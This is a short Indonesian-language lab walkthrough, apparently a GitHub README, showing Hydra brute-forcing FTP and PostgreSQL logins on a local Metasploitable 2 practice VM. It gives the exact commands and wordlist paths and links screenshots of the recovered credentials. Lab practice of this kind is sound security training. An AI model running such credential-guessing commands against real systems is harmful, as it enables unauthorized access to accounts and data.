# Hydra
- IP Metasploitable 2 di local: 192.168.1.114

## Brute Force FTP Credentials
- Gunakan perintah: `hydra -L user-metasploitable2.txt -P password-metasploitable2.txt 192.168.1.114 ftp`
- Username dan password yang ditemukan:
![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/hydra/assets/hydra-ftp.JPG?raw=true)
- Melakukan akses ke FTP Server:
![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/hydra/assets/akses-ftp.JPG?raw=true)

## Brute Force PostgreSQL Credentials
- Gunakan perintah: `hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt 192.168.1.114 postgres`
- Username dan password yang ditemukan:
![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/hydra/assets/hydra-postgres.JPG?raw=true)
- Melakukan akses ke PostgreSQL:
![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/hydra/assets/akses-postgresql.JPG?raw=true)